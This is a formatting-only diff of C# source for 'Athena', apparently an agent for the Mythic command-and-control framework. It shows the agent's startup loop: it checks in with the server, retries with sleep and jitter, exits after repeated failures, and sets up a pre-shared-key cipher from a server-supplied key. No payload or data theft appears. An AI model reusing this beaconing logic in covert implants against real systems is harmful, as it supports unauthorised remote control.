@@ -12,26 +12,26 @@ namespace Athena
     class Program
     {
         static void Main(string[] args)
-       {
+        {
             int maxMissedCheckins = 5;
             int missedCheckins = 0;
             bool exit = false;
 
             //MythicClient controls all of the agent communications
             Globals.mc = new MythicClient();
-            
+
             //First Checkin-In attempt
             CheckinResponse res = Globals.mc.CheckIn();
-            
+
             //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
-            while(res.status != "success")
+            while (res.status != "success")
             {
                 //Attempt checkin again
                 res = Globals.mc.CheckIn();
 
                 //Sleep before attempting checkin again
                 Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
-                
+
                 //Increment checkins
                 missedCheckins += 1;
 
@@ -41,7 +41,7 @@ namespace Athena
                     Environment.Exit(0);
                 }
             }
-            
+
             //We checked in successfully, reset to 0
             missedCheckins = 0;
 
@@ -49,7 +49,7 @@ namespace Athena
             Globals.mc.MythicConfig.uuid = res.id;
             if (Globals.mc.MythicConfig.currentConfig.encrypted)
             {
-                if(Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
+                if (Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                 {
                     Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
                 }
